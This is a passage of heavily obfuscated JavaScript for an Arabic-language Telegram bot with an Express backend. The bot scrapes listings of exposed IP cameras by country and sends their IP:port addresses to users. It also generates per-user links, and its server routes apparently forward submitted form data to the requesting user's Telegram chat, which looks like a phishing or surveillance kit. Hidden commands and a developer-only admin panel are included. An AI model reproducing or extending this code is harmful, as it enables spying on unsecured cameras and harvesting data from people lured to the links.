    console[_0x3ff4fa(0x235)](_0x243fac[_0x3ff4fa(0x440)], _0x2112d7[_0x3ff4fa(0x67d)]), bot[_0x3ff4fa(0x344) + 'e'](_0x366d92, _0x3ff4fa(0x1e2) + _0x3ff4fa(0x248) + _0x32661a + _0x3ff4fa(0x5e6) + _0x60f3b3)[_0x3ff4fa(0x4b4)](() => {
        const _0x158d87 = _0x3ff4fa;
        _0x68afd7[_0x158d87(0x69a)](path[_0x158d87(0x3eb)](__dirname, _0x243fac[_0x158d87(0x50d)]));
    })[_0x3ff4fa(0x3e9)](_0x5d30e9 => {
        const _0x487d0f = _0x3ff4fa;
        console[_0x487d0f(0x2dd)](_0x243fac[_0x487d0f(0x3ca)], _0x5d30e9[_0x487d0f(0x11c)] ? _0x5d30e9[_0x487d0f(0x11c)][_0x487d0f(0x67d)] : _0x5d30e9), _0x68afd7[_0x487d0f(0x1b9)](-0x1 * 0x769 + 0x1 * 0x1e85 + -0x1528)[_0x487d0f(0x3a7)](_0x243fac[_0x487d0f(0x465)]);
    });
}), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x537), (_0x1ffb46, _0x3d15bd) => {
    const _0x5a19ef = _0x4e73bb, _0x38b06b = {
            'EunLS': _0x5a19ef(0x33e) + _0x5a19ef(0x505) + _0x5a19ef(0x33f),
            'tWHJc': _0x5a19ef(0x107)
        }, _0x1eaf3d = _0x1ffb46[_0x5a19ef(0x97)][_0x5a19ef(0x577)];
    if (!_0x1eaf3d)
        return _0x3d15bd[_0x5a19ef(0x1b9)](-0x2060 + 0x1cfb + 0x4f5)[_0x5a19ef(0x3a7)](_0x38b06b[_0x5a19ef(0x214)]);
    _0x3d15bd[_0x5a19ef(0x69a)](path[_0x5a19ef(0x3eb)](__dirname, _0x38b06b[_0x5a19ef(0x2e6)]));
}), app[_0x4e73bb(0x2f2)](bodyParser[_0x4e73bb(0x3b5)]({ 'extended': !![] })), app[_0x4e73bb(0x2f2)](express[_0x4e73bb(0x523)](__dirname)), app[_0x4e73bb(0x493)](_0x4e73bb(0x466) + 'es', (_0x2ba6ef, _0xbe4aa8) => {
    const _0x284a6b = _0x4e73bb, _0x211278 = {
            'SysHE': _0x284a6b(0x208),
            'EWHjy': _0x284a6b(0x57c) + _0x284a6b(0x291) + _0x284a6b(0x487) + ':',
            'cyPOD': _0x284a6b(0x3a6) + _0x284a6b(0x170) + _0x284a6b(0x4a0) + _0x284a6b(0x4f2) + _0x284a6b(0x571),
            'IMqWa': _0x284a6b(0x3e8) + _0x284a6b(0x6b2)
        }, _0x24f20e = _0x2ba6ef[_0x284a6b(0x67d)][_0x284a6b(0x577)], _0x2c0185 = _0x2ba6ef[_0x284a6b(0x67d)][_0x284a6b(0x279)], _0x43c68a = _0x2ba6ef[_0x284a6b(0x67d)][_0x284a6b(0x2a1)];
    console[_0x284a6b(0x235)](_0x211278[_0x284a6b(0x2bb)], _0x2ba6ef[_0x284a6b(0x67d)]), bot[_0x284a6b(0x344) + 'e'](_0x24f20e, _0x284a6b(0x1e2) + _0x284a6b(0x248) + _0x2c0185 + _0x284a6b(0x5e6) + _0x43c68a)[_0x284a6b(0x4b4)](() => {
        const _0x209b52 = _0x284a6b;
        _0xbe4aa8[_0x209b52(0x69a)](path[_0x209b52(0x3eb)](__dirname, _0x211278[_0x209b52(0x35a)]));
    })[_0x284a6b(0x3e9)](_0x8ac1a7 => {
        const _0x3b936c = _0x284a6b;
        console[_0x3b936c(0x2dd)](_0x211278[_0x3b936c(0x327)], _0x8ac1a7[_0x3b936c(0x11c)] ? _0x8ac1a7[_0x3b936c(0x11c)][_0x3b936c(0x67d)] : _0x8ac1a7), _0xbe4aa8[_0x3b936c(0x1b9)](0x1 * -0xc4c + 0x2480 + -0x590 * 0x4)[_0x3b936c(0x3a7)](_0x211278[_0x3b936c(0x42b)]);
    });
}), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x5d7), (_0x773cae, _0x3ecc4d) => {
    const _0x57cfd5 = _0x4e73bb, _0x76a27e = {
            'kQZRj': _0x57cfd5(0x33e) + _0x57cfd5(0x505) + _0x57cfd5(0x33f),
            'BygxC': _0x57cfd5(0x208)
        }, _0x1ae354 = _0x773cae[_0x57cfd5(0x97)][_0x57cfd5(0x577)];
    if (!_0x1ae354)
        return _0x3ecc4d[_0x57cfd5(0x1b9)](-0x1 * 0x555 + -0x15c6 + -0xb3 * -0x29)[_0x57cfd5(0x3a7)](_0x76a27e[_0x57cfd5(0x5d2)]);
    _0x3ecc4d[_0x57cfd5(0x69a)](path[_0x57cfd5(0x3eb)](__dirname, _0x76a27e[_0x57cfd5(0x1e1)]));
});
const countryTranslation = {
        'AF': _0x4e73bb(0x36b) + _0x4e73bb(0x137),
        'AL': _0x4e73bb(0x3bb),
        'DZ': _0x4e73bb(0x171),
        'AO': _0x4e73bb(0x459),
        'AR': _0x4e73bb(0x1b8) + _0x4e73bb(0x6cb),
        'AM': _0x4e73bb(0x510),
        'AU': _0x4e73bb(0x356),
        'AT': _0x4e73bb(0x4d9),
        'AZ': _0x4e73bb(0x164),
        'BH': _0x4e73bb(0x1e5),
        'BD': _0x4e73bb(0x2cb),
        'BY': _0x4e73bb(0x1cb),
        'BE': _0x4e73bb(0x3c8),
        'BZ': _0x4e73bb(0x116),
        'BJ': _0x4e73bb(0x65d),
        'BO': _0x4e73bb(0x246),
        'BA': _0x4e73bb(0x2ad) + _0x4e73bb(0x3f5),
        'BW': _0x4e73bb(0x5d3),
        'BR': _0x4e73bb(0x1d6),
        'BG': _0x4e73bb(0x4b3),
        'BF': _0x4e73bb(0x587) + _0x4e73bb(0x3d0),
        'KH': _0x4e73bb(0xdb),
        'CM': _0x4e73bb(0x22a) + _0x4e73bb(0x234),
        'CA': _0x4e73bb(0x6b0),
        'CL': _0x4e73bb(0x2a8),
        'CN': _0x4e73bb(0x686),
        'CO': _0x4e73bb(0x14c),
        'CR': _0x4e73bb(0x168) + _0x4e73bb(0x49d),
        'HR': _0x4e73bb(0x43a),
        'CY': _0x4e73bb(0x533),
        'CZ': _0x4e73bb(0x65e),
        'DK': _0x4e73bb(0x3af),
        'EC': _0x4e73bb(0x25a) + _0x4e73bb(0x3bd),
        'EG': _0x4e73bb(0x5e2),
        'SV': _0x4e73bb(0x48e) + _0x4e73bb(0x546),
        'EE': _0x4e73bb(0x1c2),
        'ET': _0x4e73bb(0x13c),
        'FI': _0x4e73bb(0x590),
        'FR': _0x4e73bb(0x2c1),
        'GE': _0x4e73bb(0x3e7),
        'DE': _0x4e73bb(0x316),
        'GH': _0x4e73bb(0x4d1),
        'GR': _0x4e73bb(0x570),
        'GT': _0x4e73bb(0x203) + _0x4e73bb(0x4b5),
        'HN': _0x4e73bb(0x435),
        'HK': _0x4e73bb(0x598) + _0x4e73bb(0x559),
        'HU': _0x4e73bb(0x10a),
        'IS': _0x4e73bb(0x67e),
        'IN': _0x4e73bb(0x2a5),
        'ID': _0x4e73bb(0xf1) + _0x4e73bb(0x4cd),
        'IR': _0x4e73bb(0xf8),
        'IQ': _0x4e73bb(0x609),
        'IE': _0x4e73bb(0x393),
        'IL': _0x4e73bb(0x41e),
        'IT': _0x4e73bb(0x641),
        'CI': _0x4e73bb(0x60f) + _0x4e73bb(0x565),
        'JP': _0x4e73bb(0xbb),
        'JO': _0x4e73bb(0x18c),
        'KZ': _0x4e73bb(0x5a0) + _0x4e73bb(0x5dd),
        'KE': _0x4e73bb(0x179),
        'KW': _0x4e73bb(0x631),
        'KG': _0x4e73bb(0x6a9) + _0x4e73bb(0x231),
        'LV': _0x4e73bb(0x241),
        'LB': _0x4e73bb(0x287),
        'LY': _0x4e73bb(0x4cb),
        'LT': _0x4e73bb(0x1f8),
        'LU': _0x4e73bb(0x311) + _0x4e73bb(0x28f),
        'MO': _0x4e73bb(0x437),
        'MY': _0x4e73bb(0xf7),
        'ML': _0x4e73bb(0xc2),
        'MT': _0x4e73bb(0x536),
        'MX': _0x4e73bb(0x289),
        'MC': _0x4e73bb(0x35d),
        'MN': _0x4e73bb(0x4c6),
        'ME': _0x4e73bb(0x6d1) + _0x4e73bb(0x600),
        'MA': _0x4e73bb(0x34b),
        'MZ': _0x4e73bb(0x94),
        'MM': _0x4e73bb(0x4d2),
        'NA': _0x4e73bb(0x305),
        'NP': _0x4e73bb(0x529),
        'NL': _0x4e73bb(0x688),
        'NZ': _0x4e73bb(0x1ae) + _0x4e73bb(0x461),
        'NG': _0x4e73bb(0x26f),
        'KP': _0x4e73bb(0x5ae) + _0x4e73bb(0x5a4),
        'NO': _0x4e73bb(0x318),
        'OM': _0x4e73bb(0x494),
        'PK': _0x4e73bb(0x4a8),
        'PS': _0x4e73bb(0x69b),
        'PA': _0x4e73bb(0x281),
        'PY': _0x4e73bb(0x34f),
        'PE': _0x4e73bb(0x368),
        'PH': _0x4e73bb(0x680),
        'PL': _0x4e73bb(0x86),
        'PT': _0x4e73bb(0x198),
        'PR': _0x4e73bb(0x420) + _0x4e73bb(0x2c3),
        'QA': _0x4e73bb(0x1e6),
        'RO': _0x4e73bb(0x144),
        'RU': _0x4e73bb(0x59e),
        'RW': _0x4e73bb(0x156),
        'SA': _0x4e73bb(0x35c),
        'SN': _0x4e73bb(0x4fa),
        'RS': _0x4e73bb(0x1c8),
        'SG': _0x4e73bb(0x14e),
        'SK': _0x4e73bb(0x247),
        'SI': _0x4e73bb(0x59d),
        'ZA': _0x4e73bb(0x1be) + _0x4e73bb(0x551),
        'KR': _0x4e73bb(0x467) + _0x4e73bb(0x4a6),
        'ES': _0x4e73bb(0x5bd),
        'LK': _0x4e73bb(0x3ea),
        'SD': _0x4e73bb(0x48b),
        'SE': _0x4e73bb(0x1b0),
        'CH': _0x4e73bb(0x1f4),
        'SY': _0x4e73bb(0x8c),
        'TW': _0x4e73bb(0x36d),
        'TZ': _0x4e73bb(0x3dc),
        'TH': _0x4e73bb(0x2ae),
        'TG': _0x4e73bb(0x543),
        'TN': _0x4e73bb(0x148),
        'TR': _0x4e73bb(0x37e),
        'TM': _0x4e73bb(0x57d) + _0x4e73bb(0x216),
        'UG': _0x4e73bb(0x4e0),
        'UA': _0x4e73bb(0xed),
        'AE': _0x4e73bb(0x18e),
        'GB': _0x4e73bb(0x4f8),
        'US': _0x4e73bb(0x29f),
        'UY': _0x4e73bb(0x133),
        'UZ': _0x4e73bb(0x319) + _0x4e73bb(0x6b7),
        'VE': _0x4e73bb(0x695),
        'VN': _0x4e73bb(0x666),
        'ZM': _0x4e73bb(0xe1),
        'ZW': _0x4e73bb(0x541),
        'GL': _0x4e73bb(0x6a8),
        'KY': _0x4e73bb(0x373) + _0x4e73bb(0x4b1),
        'NI': _0x4e73bb(0x69e) + _0x4e73bb(0x22d),
        'DO': _0x4e73bb(0x51c) + _0x4e73bb(0x3ce),
        'NC': _0x4e73bb(0x1fa) + _0x4e73bb(0x284),
        'LA': _0x4e73bb(0x2b7),
        'TT': _0x4e73bb(0x457) + _0x4e73bb(0x655),
        'GG': _0x4e73bb(0x31d),
        'GU': _0x4e73bb(0x6a1),
        'GP': _0x4e73bb(0x211),
        'MG': _0x4e73bb(0x698),
        'RE': _0x4e73bb(0x336),
        'FO': _0x4e73bb(0x488),
        'MD': _0x4e73bb(0x109)
    }, camRequestCounts = {};
async function initStorage() {
    const _0xf5b93d = _0x4e73bb, _0x56a028 = { 'yihQh': _0xf5b93d(0x387) };
    await storage[_0xf5b93d(0x62b)](), vipUsers = await storage[_0xf5b93d(0x3ae)](_0x56a028[_0xf5b93d(0xc9)]) || [];
}
async function saveVipUsers() {
    const _0x47c01d = _0x4e73bb, _0xc5fa66 = { 'baoWU': _0x47c01d(0x387) };
    await storage[_0x47c01d(0x5b8)](_0xc5fa66[_0x47c01d(0x563)], vipUsers);
}
function showCountryList(_0x40db8e, _0x5a2be3 = -0xa52 * 0x2 + 0x20 * -0xd3 + 0x3b * 0xcc) {
    const _0x3dfc8a = _0x4e73bb, _0x2b6188 = {
            'ZZWWU': function (_0x2a0bf9, _0x5a7ee3) {
                return _0x2a0bf9 + _0x5a7ee3;
            },
            'rUiVe': function (_0x434373, _0x364e70) {
                return _0x434373 < _0x364e70;
            },
            'NcFlW': function (_0x3d418b, _0xbcf5b) {
                return _0x3d418b < _0xbcf5b;
            },
            'nWJSW': function (_0x1ff2f3, _0x27a7b4) {
                return _0x1ff2f3 + _0x27a7b4;
            },
            'HHRBF': function (_0x539f1f, _0x2c458a) {
                return _0x539f1f < _0x2c458a;
            },
            'CURKi': function (_0x2e27b0, _0x19e360) {
                return _0x2e27b0 > _0x19e360;
            },
            'SSuul': _0x3dfc8a(0x434),
            'oVhBe': _0x3dfc8a(0x379) + 'ة:'
        };
    try {
        const _0x498cce = [], _0x3175a6 = Object[_0x3dfc8a(0x6a7)](countryTranslation), _0xe43ff9 = Object[_0x3dfc8a(0x4ee)](countryTranslation), _0x2b1059 = Math[_0x3dfc8a(0x676)](_0x2b6188[_0x3dfc8a(0x395)](_0x5a2be3, -0x439 * -0x8 + -0x2295 + -0x98 * -0x2), _0x3175a6[_0x3dfc8a(0xbc)]);
        for (let _0x313099 = _0x5a2be3; _0x2b6188[_0x3dfc8a(0x6c7)](_0x313099, _0x2b1059); _0x313099 += -0xb99 + -0x3 * 0xb35 + 0x2d3b) {
            const _0x1715ea = [];
            for (let _0x2ca7da = _0x313099; _0x2b6188[_0x3dfc8a(0x3e6)](_0x2ca7da, _0x2b6188[_0x3dfc8a(0x57a)](_0x313099, -0x26f + -0x1b40 + -0x1db2 * -0x1)) && _0x2b6188[_0x3dfc8a(0x625)](_0x2ca7da, _0x2b1059); _0x2ca7da++) {
                const _0x158fe1 = _0x3175a6[_0x2ca7da], _0x55c0b3 = _0xe43ff9[_0x2ca7da];
                _0x1715ea[_0x3dfc8a(0x370)]({
                    'text': _0x55c0b3,
                    'callback_data': _0x158fe1
                });
            }
            _0x498cce[_0x3dfc8a(0x370)](_0x1715ea);
        }
        const _0x1d06c2 = [];
        _0x2b6188[_0x3dfc8a(0x651)](_0x5a2be3, -0xb31 + -0x1426 + 0x1f57 * 0x1) && _0x1d06c2[_0x3dfc8a(0x370)], _0x2b6188[_0x3dfc8a(0x3e6)](_0x2b1059, _0x3175a6[_0x3dfc8a(0xbc)]) && _0x1d06c2[_0x3dfc8a(0x370)]({
            'text': _0x2b6188[_0x3dfc8a(0x145)],
            'callback_data': _0x3dfc8a(0x378) + _0x2b1059
        }), _0x1d06c2[_0x3dfc8a(0xbc)] && _0x498cce[_0x3dfc8a(0x370)](_0x1d06c2), bot[_0x3dfc8a(0x344) + 'e'](_0x40db8e, _0x2b6188[_0x3dfc8a(0x6a6)], { 'reply_markup': { 'inline_keyboard': _0x498cce } });
    } catch (_0x29f2ec) {
        bot[_0x3dfc8a(0x344) + 'e'](_0x40db8e, _0x3dfc8a(0x34d) + _0x3dfc8a(0x628) + _0x3dfc8a(0x2e4) + _0x29f2ec[_0x3dfc8a(0x2c2)]);
    }
}
async function displayCameras(_0xb82773, _0x57aba2) {
    const _0x1b2c2c = _0x4e73bb, _0x1222ca = {
            'XdBvi': _0x1b2c2c(0x308) + _0x1b2c2c(0x42d) + _0x1b2c2c(0x636),
            'VfRRZ': function (_0x4d0529, _0x380ddf) {
                return _0x4d0529 < _0x380ddf;
            },
            'BBJmK': function (_0x9914a5, _0x43d27b) {
                return _0x9914a5 % _0x43d27b;
            },
            'IePdm': _0x1b2c2c(0x10c) + _0x1b2c2c(0x1bc) + _0x1b2c2c(0x478) + _0x1b2c2c(0x540) + _0x1b2c2c(0x114) + _0x1b2c2c(0x178) + _0x1b2c2c(0xab) + _0x1b2c2c(0x383) + _0x1b2c2c(0x38a) + _0x1b2c2c(0x110) + _0x1b2c2c(0x479) + '6',
            'sqryG': _0x1b2c2c(0x98) + _0x1b2c2c(0x52d) + _0x1b2c2c(0x50f) + _0x1b2c2c(0x41c) + _0x1b2c2c(0x63e) + _0x1b2c2c(0x200) + _0x1b2c2c(0x444) + _0x1b2c2c(0x5c1) + _0x1b2c2c(0x414) + _0x1b2c2c(0x4ac),
            'kubhP': function (_0x150b3c, _0x392d7b, _0x49a13d) {
                return _0x150b3c(_0x392d7b, _0x49a13d);
            },
            'crdwk': function (_0x3dfc5d, _0x525cb0) {
                return _0x3dfc5d <= _0x525cb0;
            },
            'dBhOb': function (_0x64e6a3, _0x1f090e) {
                return _0x64e6a3 + _0x1f090e;
            },
            'MkfbF': _0x1b2c2c(0x6cd) + _0x1b2c2c(0x52d) + _0x1b2c2c(0x50f) + _0x1b2c2c(0x127) + _0x1b2c2c(0x380) + _0x1b2c2c(0x5b9) + _0x1b2c2c(0x1ef) + _0x1b2c2c(0x5c8) + _0x1b2c2c(0xac) + _0x1b2c2c(0x5be) + _0x1b2c2c(0x572) + _0x1b2c2c(0x46a) + _0x1b2c2c(0x56c) + _0x1b2c2c(0x697) + _0x1b2c2c(0x2a4) + _0x1b2c2c(0x40d) + _0x1b2c2c(0x5ff) + _0x1b2c2c(0x162) + _0x1b2c2c(0x55d),
            'hOumL': _0x1b2c2c(0x98) + _0x1b2c2c(0x52d) + _0x1b2c2c(0x50f) + _0x1b2c2c(0x41c) + _0x1b2c2c(0x63e) + _0x1b2c2c(0x18b) + _0x1b2c2c(0x6af) + _0x1b2c2c(0x596) + _0x1b2c2c(0x167) + _0x1b2c2c(0x2d4)
        };
    try {
        const _0x2a0558 = await bot[_0x1b2c2c(0x344) + 'e'](_0xb82773, _0x1222ca[_0x1b2c2c(0x2ca)]), _0x58b10c = _0x2a0558[_0x1b2c2c(0x6a5)];
        for (let _0x1a02de = 0x223 * -0x9 + -0x1714 + 0x2a4f * 0x1; _0x1222ca[_0x1b2c2c(0x270)](_0x1a02de, 0xbe9 * -0x2 + -0x2 * -0x731 + 0x97f); _0x1a02de++) {
            await bot[_0x1b2c2c(0x658) + _0x1b2c2c(0x603)](_0x1b2c2c(0x308) + _0x1b2c2c(0x42d) + _0x1b2c2c(0x37a) + '.'[_0x1b2c2c(0x54a)](_0x1222ca[_0x1b2c2c(0x6cc)](_0x1a02de, -0x1ab * -0x7 + -0xfec + 0x443 * 0x1)), {
                'chat_id': _0xb82773,
                'message_id': _0x58b10c
            }), await new Promise(_0xc5ae26 => setTimeout(_0xc5ae26, 0x243f + -0x1120 + 0x13 * -0xcd));
        }
        const _0x5ef45f = _0x1b2c2c(0x63a) + _0x1b2c2c(0x10f) + _0x1b2c2c(0x28d) + _0x1b2c2c(0x40c) + _0x57aba2, _0x2ee52b = { 'User-Agent': _0x1222ca[_0x1b2c2c(0x60a)] };
        let _0x2fcf62 = await axios[_0x1b2c2c(0x5b5)](_0x5ef45f, { 'headers': _0x2ee52b });
        const _0x158edc = _0x2fcf62[_0x1b2c2c(0x301)][_0x1b2c2c(0x3d3)](/pagenavigator\("\?page=", (\d+)/);
        if (!_0x158edc) {
            bot[_0x1b2c2c(0x344) + 'e'](_0xb82773, _0x1222ca[_0x1b2c2c(0x2c4)]);
            return;
        }
        const _0x116153 = _0x1222ca[_0x1b2c2c(0x582)](parseInt, _0x158edc[0x20d4 + -0x1239 + -0xe9a], -0x608 + 0x25d1 + -0xa95 * 0x3), _0x220867 = [];
        for (let _0x1ac5a8 = 0x4b * -0x67 + 0x1 * 0x21bb + -0x38d; _0x1222ca[_0x1b2c2c(0x1fd)](_0x1ac5a8, _0x116153); _0x1ac5a8++) {
            _0x2fcf62 = await axios[_0x1b2c2c(0x5b5)](_0x5ef45f + _0x1b2c2c(0x32d) + _0x1ac5a8, { 'headers': _0x2ee52b });
            const _0x180c2c = _0x2fcf62[_0x1b2c2c(0x301)][_0x1b2c2c(0x3d3)](/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            _0x220867[_0x1b2c2c(0x370)](..._0x180c2c);
        }
        if (_0x220867[_0x1b2c2c(0xbc)]) {
            const _0x254ce3 = _0x220867[_0x1b2c2c(0x6bd)]((_0x560c8f, _0x4b3fb1) => _0x4b3fb1 + (-0x11df + -0x2dd * 0xb + 0x315f) + '.\x20' + _0x560c8f);
            for (let _0x42caf6 = 0x7 * 0x1a1 + -0x10c2 + 0x1c9 * 0x3; _0x1222ca[_0x1b2c2c(0x270)](_0x42caf6, _0x254ce3[_0x1b2c2c(0xbc)]); _0x42caf6 += 0x3e5 * 0x1 + 0x199d + -0x38 * 0x86) {
                const _0x51e81a = _0x254ce3[_0x1b2c2c(0x213)](_0x42caf6, _0x1222ca[_0x1b2c2c(0x1e4)](_0x42caf6, -0x5a8 * 0x5 + -0x2 * 0x1a3 + -0xfe * -0x20));
                await bot[_0x1b2c2c(0x344) + 'e'](_0xb82773, _0x51e81a[_0x1b2c2c(0x3eb)]('\x0a'));
            }
            await bot[_0x1b2c2c(0x344) + 'e'](_0xb82773, _0x1222ca[_0x1b2c2c(0x3f6)]);
        } else
            await bot[_0x1b2c2c(0x344) + 'e'](_0xb82773, _0x1222ca[_0x1b2c2c(0x6c2)]);
    } catch (_0x41b4fc) {
        await bot[_0x1b2c2c(0x344) + 'e'](_0xb82773, _0x1b2c2c(0x98) + _0x1b2c2c(0x52d) + _0x1b2c2c(0x50f) + _0x1b2c2c(0x41c) + _0x1b2c2c(0x63e) + _0x1b2c2c(0x18b) + _0x1b2c2c(0x6af) + _0x1b2c2c(0x596) + _0x1b2c2c(0x167) + _0x1b2c2c(0x2d4));
    }
}
function isDeveloper(_0x329767) {
    const _0x2bf0f6 = _0x4e73bb, _0xe91de7 = {
            'MaHCf': function (_0x30d81a, _0x25592a) {
                return _0x30d81a === _0x25592a;
            }
        }, _0x10cd66 = -0x13 * -0xb0d0acd + 0x1f3e1a080 + -0x16fc63dfd;
    return _0xe91de7[_0x2bf0f6(0x18f)](_0x329767, _0x10cd66);
}
function showAdminPanel(_0x3e3c37) {
    const _0x3524e1 = _0x4e73bb, _0xa93006 = {
            'bdvMY': _0x3524e1(0x260) + 'م:',
            'EaUMd': _0x3524e1(0x252) + _0x3524e1(0x5b2),
            'eFGKb': _0x3524e1(0x4ab),
            'feVNg': _0x3524e1(0x56e) + _0x3524e1(0x5b2),
            'azUTa': _0x3524e1(0x4f9)
        };
    bot[_0x3524e1(0x344) + 'e'](_0x3e3c37, _0xa93006[_0x3524e1(0x617)], {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0xa93006[_0x3524e1(0x4d0)],
                        'callback_data': _0xa93006[_0x3524e1(0x573)]
                    }],
                [{
                        'text': _0xa93006[_0x3524e1(0x357)],
                        'callback_data': _0xa93006[_0x3524e1(0x659)]
                    }]
            ]
        }
    });
}
bot[_0x4e73bb(0x2d9)](/\/jjjjjavayy/, _0x56c97a => {
    const _0x362052 = _0x4e73bb, _0x24910 = {
            'POsCc': _0x362052(0x4be) + _0x362052(0x3c5) + _0x362052(0x2d8) + _0x362052(0x62f) + _0x362052(0x68a),
            'LfNkw': _0x362052(0x31b) + 'ي',
            'iVOmJ': _0x362052(0x126),
            'HUOGm': _0x362052(0x23e) + _0x362052(0x4a7),
            'eXlsl': _0x362052(0x209) + 're',
            'qRRLN': _0x362052(0x242) + 'ء',
            'cqDaq': _0x362052(0x3f8)
        }, _0x19c4cb = _0x56c97a[_0x362052(0x662)]['id'], _0x2c25b6 = _0x24910[_0x362052(0x2ef)];
    bot[_0x362052(0x344) + 'e'](_0x19c4cb, _0x2c25b6, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x24910[_0x362052(0x6d0)],
                        'callback_data': _0x24910[_0x362052(0x1b3)]
                    }],
                [{
                        'text': _0x24910[_0x362052(0x9e)],
                        'callback_data': _0x24910[_0x362052(0x399)]
                    }],
                [{
                        'text': _0x24910[_0x362052(0x302)],
                        'callback_data': _0x24910[_0x362052(0x8e)]
                    }]
            ]
        }
    });
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), _0x14017d => {
    const _0x316afb = _0x4e73bb, _0xafdcb1 = {
            'LojfF': function (_0x2bcdeb, _0x5ebdcf) {
                return _0x2bcdeb === _0x5ebdcf;
            },
            'GwOSz': _0x316afb(0x126),
            'Qdbfp': function (_0x588d45, _0x53498e) {
                return _0x588d45 === _0x53498e;
            },
            'sMxpM': _0x316afb(0x209) + 're',
            'RNvxA': _0x316afb(0x3f8),
            'KGeeI': _0x316afb(0x4b9) + _0x316afb(0x12d) + '\x20✅',
            'TTRBP': _0x316afb(0x6b4)
        }, _0x4b3e7f = _0x14017d[_0x316afb(0x2c2)][_0x316afb(0x662)]['id'];
    let _0xefe8f2;
    if (_0xafdcb1[_0x316afb(0x239)](_0x14017d[_0x316afb(0x301)], _0xafdcb1[_0x316afb(0x377)]))
        _0xefe8f2 = baseUrl + (_0x316afb(0x17c) + _0x316afb(0x2ab)) + _0x4b3e7f + _0x316afb(0x44c);
    else {
        if (_0xafdcb1[_0x316afb(0x588)](_0x14017d[_0x316afb(0x301)], _0xafdcb1[_0x316afb(0x6c9)]))
            _0xefe8f2 = baseUrl + (_0x316afb(0x5e4) + _0x316afb(0x2ab)) + _0x4b3e7f + _0x316afb(0x44c);
        else
            _0xafdcb1[_0x316afb(0x588)](_0x14017d[_0x316afb(0x301)], _0xafdcb1[_0x316afb(0x548)]) && (_0xefe8f2 = baseUrl + (_0x316afb(0x1c4) + _0x316afb(0x2ab)) + _0x4b3e7f + _0x316afb(0x44c));
    }
    if (_0xefe8f2)
        bot[_0x316afb(0x344) + 'e'](_0x4b3e7f, _0x316afb(0x2c5) + _0x316afb(0x150) + _0xefe8f2), bot[_0x316afb(0x5f0) + _0x316afb(0x11f)](_0x14017d['id'], { 'text': _0xafdcb1[_0x316afb(0x326)] });
    else
        _0xafdcb1[_0x316afb(0x239)](_0x14017d[_0x316afb(0x301)], _0xafdcb1[_0x316afb(0x1af)]) && (bot[_0x316afb(0x344) + 'e'](_0x4b3e7f, _0x316afb(0x502) + _0x316afb(0x403) + _0x316afb(0x106) + _0x316afb(0x3d6) + _0x316afb(0x43e) + _0x316afb(0x100) + _0x316afb(0x657) + 'ip'), bot[_0x316afb(0x5f0) + _0x316afb(0x11f)](_0x14017d['id'], { 'text': '' }));
}), bot[_0x4e73bb(0x2d9)](/\/نننطسطوو/, _0x56af35 => {
    const _0x33b9af = _0x4e73bb, _0x428b71 = {
            'ouZLq': _0x33b9af(0x40f) + _0x33b9af(0x4fd) + _0x33b9af(0x6ab) + _0x33b9af(0x2bf),
            'CZykq': _0x33b9af(0x21e) + _0x33b9af(0x104),
            'PNAwo': _0x33b9af(0x31a) + 's',
            'xNkAa': function (_0x4cdc72, _0x300e9e) {
                return _0x4cdc72(_0x300e9e);
            }
        }, _0xdba0b7 = _0x56af35[_0x33b9af(0x662)]['id'];
    bot[_0x33b9af(0x344) + 'e'](_0xdba0b7, _0x428b71[_0x33b9af(0x4f7)], {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x428b71[_0x33b9af(0x300)],
                        'callback_data': _0x428b71[_0x33b9af(0xd3)]
                    }]]
        }
    }), _0x428b71[_0x33b9af(0x2b3)](isDeveloper, _0xdba0b7) && _0x428b71[_0x33b9af(0x2b3)](showAdminPanel, _0xdba0b7);
}), bot['on'](_0x4e73bb(0x458) + _0x4e73bb(0xa5), async _0x4f9957 => {
    const _0xd3efc2 = _0x4e73bb, _0x6100c9 = {
            'cIspE': function (_0x310a25, _0x2b658d) {
                return _0x310a25 === _0x2b658d;
            },
            'fBfZN': _0xd3efc2(0x31a) + 's',
            'ZOXfU': function (_0x406463, _0x351e5b) {
                return _0x406463(_0x351e5b);
            },
            'ynDbM': function (_0xdb7d63, _0xee71b0) {
                return _0xdb7d63 in _0xee71b0;
            },
            'FQZtP': function (_0x43c4c4, _0x3ebe8d, _0x15aab) {
                return _0x43c4c4(_0x3ebe8d, _0x15aab);
            },
            'pkcGh': _0xd3efc2(0x378),
            'UlBvL': _0xd3efc2(0x36f),
            'OlKxx': function (_0x53c010, _0x1c56dd) {
                return _0x53c010 - _0x1c56dd;
            }
        }, _0x67942 = _0x4f9957[_0xd3efc2(0x2c2)][_0xd3efc2(0x662)]['id'];
    if (_0x6100c9[_0xd3efc2(0x3aa)](_0x4f9957[_0xd3efc2(0x301)], _0x6100c9[_0xd3efc2(0x6bc)]))
        _0x6100c9[_0xd3efc2(0xd7)](showCountryList, _0x67942);
    else {
        if (_0x6100c9[_0xd3efc2(0xdd)](_0x4f9957[_0xd3efc2(0x301)], countryTranslation))
            bot[_0xd3efc2(0x67b) + _0xd3efc2(0x607)](_0x67942, _0x4f9957[_0xd3efc2(0x2c2)][_0xd3efc2(0x6a5)]), _0x6100c9[_0xd3efc2(0x663)](displayCameras, _0x67942, _0x4f9957[_0xd3efc2(0x301)]);
        else {
            if (_0x4f9957[_0xd3efc2(0x301)][_0xd3efc2(0x2a7)](_0x6100c9[_0xd3efc2(0x35f)])) {
                const _0x5c87c8 = _0x6100c9[_0xd3efc2(0x663)](parseInt, _0x4f9957[_0xd3efc2(0x301)][_0xd3efc2(0x472)]('_')[-0x996 + 0x1 * 0x25bd + -0x1c26], -0x130 + 0x21c0 + 0x2 * -0x1043);
                bot[_0xd3efc2(0x67b) + _0xd3efc2(0x607)](_0x67942, _0x4f9957[_0xd3efc2(0x2c2)][_0xd3efc2(0x6a5)]), _0x6100c9[_0xd3efc2(0x663)](showCountryList, _0x67942, _0x5c87c8);
            } else {
                if (_0x4f9957[_0xd3efc2(0x301)][_0xd3efc2(0x2a7)](_0x6100c9[_0xd3efc2(0x1ce)])) {
